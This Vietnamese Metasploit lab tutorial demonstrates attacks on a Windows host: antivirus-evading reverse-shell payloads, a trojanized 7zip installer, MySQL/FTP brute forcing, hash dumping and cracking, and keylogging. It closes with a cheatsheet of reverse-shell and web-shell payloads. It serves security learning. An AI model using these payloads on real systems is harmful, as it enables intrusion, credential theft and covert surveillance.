---
title: "Metasploit Notebook"
description: "Hướng dẫn các kỹ thuật kiểm thử hệ thống bằng Metasploit"
summary: "Hướng dẫn các kỹ thuật kiểm thử hệ thống bằng Metasploit"
categories: ["Notebook"]
tags: ["Technical", "Vietnamese"]
#externalUrl: ""
date: 2024-08-03
draft: false
authors:
  - ducnocrypt
cover: "/images/post_covers/metasploit_notebook.png"
---

# Metasploit Notebook


**Bài viết này nhằm mục đích ghi chú và hướng dẫn thực hành các kỹ thuật kiểm tra thâm nhập hệ thống bằng Metasploit**


Trong bài viết này mình sẽ quy định IP của 2 máy như sau:

- IP máy Attacker: 10.0.2.5
- IP máy Victim: 10.0.2.15

Mình sẽ sử dụng [nmap](https://nmap.org/) để kiểm tra các port được mở trên máy nạn nhân:
```
nmap -sV -A 10.0.2.15
```
![nmap_scan_victim](/images/Metasploit_Notebook/1.png)

Kết quả cho thấy máy windows đang mở rất nhiều port có thể exploit. Trong đó có 1 port đặc biệt lưu ý:

- Dịch vụ microsoft-ds đang chạy trên **port 445**, và Nmap đã xác định chính xác hệ điều hành là **Windows Server 2008** R2. Đây là một dấu hiệu cho thấy máy chủ có thể tồn tại lỗ hổng **[MS17-010 (EternalBlue)](https://www.avast.com/c-eternalblue)**, một trong những lỗ hổng nghiêm trọng và phổ biến nhất trên các hệ thống Windows cũ
- Ngoài ra chúng ta còn thấy những port đáng chú ý khác như: **Dịch vụ FTP (Port 21)**, **Dịch vụ Web (Port 80 - IIS 7.5)**

*Và trong bài viết này, mình sẽ khai thác tối đa các lỗ hổng từ các port được mở này*

##  Sage Malware

**Encoder** được sử dụng để mã hóa payload, thay đổi signature (chữ ký) của file nhằm mục đích kiểm tra khả năng phát hiện của các chương trình diệt virus (Antivirus) trong môi trường thử nghiệm. Khi payload được thực thi trên máy thử nghiệm, một đoạn mã giải mã nhỏ (decoder stub) sẽ được chạy trước để khôi phục lại payload ban đầu trong bộ nhớ trước khi thực thi.

### 1. Tạo Payload đã mã hóa

Sử dụng **MSFVenom** để tạo một file `.exe` với payload `windows/meterpreter/reverse_tcp`. Chúng ta sẽ dùng encoder `shikata_ga_nai` với 5 vòng lặp (`-i 5`) để mã hóa.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.5 LPORT=1119 -e x86/shikata_ga_nai -i 5 -f exe -o mahoa.exe
```

**Giải thích các options:**
- `-p`: Chọn payload
- `LHOST`: IP của máy tấn công (Kali Linux)
- `LPORT`: Port lắng nghe trên máy tấn công
- `-e`: Chỉ định encoder
- `-i`: Số lần mã hóa lặp lại
- `-f`: Định dạng file output
- `-o`: Tên file output

![Ảnh chụp màn hình 2025-08-03 175132](/images/Metasploit_Notebook/2.png)


### 2. Tạo Web Server để Phân phối Payload

Từ một cửa sổ terminal khác trên Kali, tạo một web server đơn giản bằng Python để máy thử nghiệm có thể tải file về.

```bash
python3 -m http.server 80
```

![Ảnh chụp màn hình 2025-08-03 175246](/images/Metasploit_Notebook/3.png)


### 3. Cấu hình Listener (Handler)

Quay lại msfconsole, chúng ta cần cài đặt một "trình xử lý" (handler) để lắng nghe kết nối ngược từ payload khi nó được thực thi.

```bash
# Sử dụng module multi/handler
use exploit/multi/handler

# Cài đặt payload tương ứng với file đã tạo
set PAYLOAD windows/meterpreter/reverse_tcp

# Cài đặt các thông số LHOST và LPORT trùng khớp
set LHOST 10.0.2.5 #IP máy tấn công
set LPORT 1119 #set port tùy ý

# Bắt đầu lắng nghe
exploit
```

![Ảnh chụp màn hình 2025-08-03 175502](/images/Metasploit_Notebook/4.png)
Lúc này máy Attacker bắt đầu lắng nghe máy victim trên port 1119

### 4. Thực thi và Kết nối

Khi máy Victim, ta tiến hành truy cập và tải file ta vừa tạo
![Ảnh chụp màn hình 2025-08-03 175958](/images/Metasploit_Notebook/5.png)

*Ở đây mình chỉ làm trên môi trường lab phục vụ cho việc học nên sẽ không có sự chỉnh chu về giao diện cũng như phising social nhé*

Trên máy Victim, chạy file mahoa.exe. Lúc này một phiên Meterpreter sẽ được tự động kết nối về máy Attack

![Ảnh chụp màn hình 2025-08-03 180031](/images/Metasploit_Notebook/6.png)

Từ đây về cơ bản ta đã có shell, chiếm quyền điều khiển từ máy Victim

![Ảnh chụp màn hình 2025-08-03 180408](/images/Metasploit_Notebook/7.png)
![Ảnh chụp màn hình 2025-08-03 202108](/images/Metasploit_Notebook/8.png)

**Ở đây mình có 1 biến thể dạng vuln đó là nhúng payload vào các file nổi tiếng, uy tín như 7zip, winrar, calculate...**

![Ảnh chụp màn hình 2025-08-03 202320](/images/Metasploit_Notebook/9.png)

ta tiến hành down file 7zip về, sau đó dùng payload của msf để chèn shell vào 

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.5 LPORT=1115 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 4 -o /home/kali/Downloads/7z2408.exe
```
![Ảnh chụp màn hình 2025-08-03 202406](/images/Metasploit_Notebook/10.png)

Ở trên máy victim, ta tiến hành down file 7zip về và run
![Ảnh chụp màn hình 2025-08-03 202727](/images/Metasploit_Notebook/11.png)

Kết quả vẫn lấy được shell và chiếm quyền điều khiển

![Ảnh chụp màn hình 2025-08-03 202827](/images/Metasploit_Notebook/12.png)

##  Khai thác MySQL - FTP

Mục tiêu của phần này là rà quét và kiểm tra các dịch vụ mạng phổ biến như MySQL và FTP để đánh giá bảo mật.

### MySQL

#### 1. Rà quét Dịch vụ MySQL

Sử dụng module mysql_version để xác định sự tồn tại và phiên bản của dịch vụ MySQL trên máy mục tiêu.

```bash
# Tìm module quét MySQL
search mysql_version

# Sử dụng module
use auxiliary/scanner/mysql/mysql_version

# Thiết lập dải IP của máy mục tiêu
set RHOSTS 10.0.2.15

# Chạy quét
run
```
**Kết quả rà quét thành công máy có chạy dịch vụ MySQL**

![Ảnh chụp màn hình 2025-08-03 203338](/images/Metasploit_Notebook/13.png)


#### 2. Kiểm tra Bảo mật Đăng nhập

Sử dụng module mysql_login để kiểm tra các cấu hình đăng nhập yếu.
Trước tiên phải có file rockyou để bruteforce:
![Ảnh chụp màn hình 2025-08-03 203938](/images/Metasploit_Notebook/14.png)

Sau đó tiến hành giải nén và thực hiện các lệnh sau
```bash
use auxiliary/scanner/mysql/mysql_login

# Dò tìm các tài khoản có mật khẩu trống
set BLANK_PASSWORDS true

# Sử dụng file wordlist chứa user và pass
set USER_FILE /usr/share/wordlists/rockyou.txt

# Thiết lập IP mục tiêu
set RHOSTS 10.0.2.15

# Chạy kiểm tra
run
```

**Kết quả:** Nếu phát hiện cấu hình yếu, module sẽ trả về các thông tin đăng nhập.

![Ảnh chụp màn hình 2025-08-03 204209](/images/Metasploit_Notebook/15.png)

![Ảnh chụp màn hình 2025-08-03 204218](/images/Metasploit_Notebook/16.png)

```
[+] 10.0.2.15:3306 - Success: 'root'
```



### FTP

#### 1. Rà quét Dịch vụ FTP

Tương tự, ta tìm và quét phiên bản FTP đang chạy trên mục tiêu.

```bash
# Tìm module quét version FTP
search ftp_version

# Sử dụng module
use auxiliary/scanner/ftp/ftp_version

# Thiết lập IP mục tiêu và chạy
set RHOSTS 10.0.2.15
run
```

**Kết quả:** Trả về phiên bản FTP, ví dụ vsftpd 2.3.4. Từ đây, ta có thể tìm các lỗ hổng cụ thể cho phiên bản này.

![Ảnh chụp màn hình 2025-08-03 205054](/images/Metasploit_Notebook/17.png)


#### 2. Kiểm tra Cấu hình Bảo mật

Kiểm tra FTP có các cấu hình yếu kém như cho phép đăng nhập ẩn danh (anonymous).

*Mục đích lỗ hổng là giúp chúng ta cài backdoor vào máy Victim*

Trước hết, tìm và down file [FTP password list](https://github.com/b-tekinli/FTP-Brute/blob/main/ftp-betterdefaultpasslist.txt)

```bash
# Sử dụng module quét đăng nhập FTP
use auxiliary/scanner/ftp/ftp_login

# Tùy chọn: Quét các tài khoản không có mật khẩu
set EMPTY_PASSWORDS true

# Tùy chọn: Quét các tài khoản có username trùng với password
set USER_AS_PASS true

# Chọn payload FTP để bruteforce
set USER_FILE /home/kali/Desktop/metasploit-lab/ftp-scan.txt

# Thiết lập IP và chạy
set RHOSTS 10.0.2.15

run
```
![Ảnh chụp màn hình 2025-08-03 210615](/images/Metasploit_Notebook/18.png)



##  Leo thang đặc quyền và trích xuất thông tin hệ thống

Recon nãy giờ cũng được kha khá. Mình quay lại session khi chiếm được shell

Sau khi đã có quyền truy cập hệ thống (có session Meterpreter), bước tiếp theo là đánh giá mức độ rủi ro và trích xuất các thông tin để phân tích bảo mật.
### Leo thang đặc quyền

Sau khi chiếm được Shell căn bản chúng ta sẽ làm gì tiếp theo?

- Lúc này ta khai thác thành công và có shell căn bản của máy bị nhiễm mã độc MS17010
- Máy Window lúc này đang mở cổng SMB port 445.

**Mong muốn lúc này ta vượt qua giởi hạn của shell căn bản**

Thông tin về lệnh  ***getsystem***, nó cần có một quyền cao hơn thì mới có thể chạy được. Để xem các lệnh căn bản ta có thể gõ " help ". Muốn chạy các câu lệnh sâu hơn , leo thang trong hệ thống.
![Ảnh chụp màn hình 2025-08-03 212145](/images/Metasploit_Notebook/19.png)

Liệt kê các process đang chạy trên máy Victim
![Ảnh chụp màn hình 2025-08-03 212226](/images/Metasploit_Notebook/20.png)

Sử dụng lệnh ***migrate***
![Ảnh chụp màn hình 2025-08-03 212400](/images/Metasploit_Notebook/21.png)

Hmm.. Shell lúc này bị giới hạn, chúng ta chưa thể leo thang đi sâu vào bên trong hệ thống.
Tiếp tục khai thác, Tìm thử thông tin quản trị các tiến trình chạy ngầm
![Ảnh chụp màn hình 2025-08-03 212701](/images/Metasploit_Notebook/22.png)

Ở đây ta thấy được đứa con quen thuộc rùi này🤭
Mình đã thử tìm các vấn đề liên quan đến bản vá lỗi Window và cũng có 1 số kết quả trả về
![Ảnh chụp màn hình 2025-08-03 213121](/images/Metasploit_Notebook/23.png)

**Cho thấy rằng mình đang có quyền quản trị**

![Ảnh chụp màn hình 2025-08-03 213241](/images/Metasploit_Notebook/24.png)

**Thành công khi lấy được quyền sâu bên trong hệ thống:>**

Thực ra còn 1 cách nếu như việc recon bị giới hạn bởi shell khi không thể can thiệp sâu. Đó là tải [Backdoor](https://github.com/jajp777/sysret) về. Từ đó ta có thể chui vào trong Window và chạy file kèm PID của Process Explorer
![Ảnh chụp màn hình 2025-08-03 213903](/images/Metasploit_Notebook/25.png)
![Ảnh chụp màn hình 2025-08-03 214010](/images/Metasploit_Notebook/26.png)


### Trích xuất thông tin hệ thống

#### Sử dụng HashDump
![Ảnh chụp màn hình 2025-08-03 214134](/images/Metasploit_Notebook/27.png)

Module Hashdump sẽ giúp chúng ta lấy các Account từ CSDL SAM Database
```bash
# Liệt kê các session đang hoạt động
sessions -l

# Tương tác với session mong muốn (ví dụ session 3)
sessions -i 3

# Chạy hashdump
run post/windows/gather/hashdump
```

**Kết quả:** Các hash NTLM của người dùng trên hệ thống sẽ được hiển thị.

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Victim:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

![Ảnh chụp màn hình 2025-08-03 214445](/images/Metasploit_Notebook/28.png)


#### Sử dụng smart_hashdump

Đây là một module mạnh mẽ hơn, có thể vượt qua các cơ chế bảo vệ và lấy hash ngay cả khi tiến trình lsass.exe được bảo vệ.

```bash
# Chạy smart_hashdump trong session
run post/windows/gather/smart_hashdump
```

#### Kiểm tra Độ mạnh Mật khẩu với John The Ripper

Metasploit tích hợp module John The Ripper để kiểm tra độ mạnh của các hash đã thu thập được.

```bash
# Sử dụng module John the Ripper
use post/windows/gather/credentials/john_ripper

# Xem các tùy chọn
options

# Sử dụng wordlist để kiểm tra
set WORDLIST /usr/share/wordlists/fasttrack.txt

# Chạy module kiểm tra trong session
run
```

**Kết quả:** Nếu mật khẩu yếu, password dạng clear-text sẽ được hiển thị.

```
[+] 'Victim' account password cracked: 'P@ssword!'
```

Sau khi leo thang đặc quyền thành công thì ta còn có thể thực hiện nhiều biến thể khác như keylogger, c2c...

![Ảnh chụp màn hình 2025-08-03 214812](/images/Metasploit_Notebook/29.png)

Trên máy Victim thử gõ vài từ
![Ảnh chụp màn hình 2025-08-03 214843](/images/Metasploit_Notebook/30.png)

Quay trở lại cmd của Kali
![Ảnh chụp màn hình 2025-08-03 214858](/images/Metasploit_Notebook/31.png)

Ngoài ra ta còn có thể sử dụng tính năng tương tự record lại các key này. Quá trình này sẽ ghi lại keystroke trên máy Victim, đồng thời truy cập vào nơi lưu thông tin do thám được

![Ảnh chụp màn hình 2025-08-03 214950](/images/Metasploit_Notebook/32.png)

![Ảnh chụp màn hình 2025-08-03 215119](/images/Metasploit_Notebook/33.png)

Ok, tạm thời tới đây thôi vì lỗ hổng này còn rất nhiều thứ khai thác được..

##  Cheatsheet

*Danh sách các lệnh MSFVenom phổ biến để tạo ra các loại payload khác nhau cho mục đích kiểm tra bảo mật.*

### Payloads Nhị phân (Binaries)

**Linux Meterpreter Reverse Shell (ELF)**
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Port> -f elf > shell.elf
```

**Windows Meterpreter Reverse Shell (EXE)**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Port> -f exe > shell.exe
```

**Windows Reverse Shell (Mã hóa)**
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```

**macOS Reverse Shell (Macho)**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f macho > shell.macho
```

### Web Payloads

**PHP Meterpreter Reverse TCP**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<Port> -f raw > shell.php
```

**ASP Meterpreter Reverse TCP**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Port> -f asp > shell.asp
```

**JSP Reverse TCP**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f raw > shell.jsp
```

**WAR (Web Application Archive)**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f war > shell.war
```

### Scripting Payloads

**Python Reverse Shell**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<Port> -f raw > shell.py
```

**Bash Reverse Shell**
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<Port> -f raw > shell.sh
```

**Perl Reverse Shell**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<Port> -f raw > shell.pl
```

### Tạo User trên Windows (Cho mục đích kiểm tra)
```bash
msfvenom -p windows/adduser USER=testuser PASS='Test123$' -f exe > adduser.exe
```

### Cấu hình Listener (Handler)
```bash
use exploit/multi/handler
set PAYLOAD <Tên_Payload_Tương_Ứng>
set LHOST <IP_Máy_Kiểm_Tra>
set LPORT <Port_Lắng_Nghe>
exploit -j
```


**⚠️ LƯU Ý :**
- Tài liệu này chỉ dành cho mục đích học tập và kiểm tra bảo mật
- Luôn tuân thủ các quy định pháp luật và chính sách bảo mật của tổ chức
- Các kỹ thuật này nên được thực hiện trong môi trường lab cô lập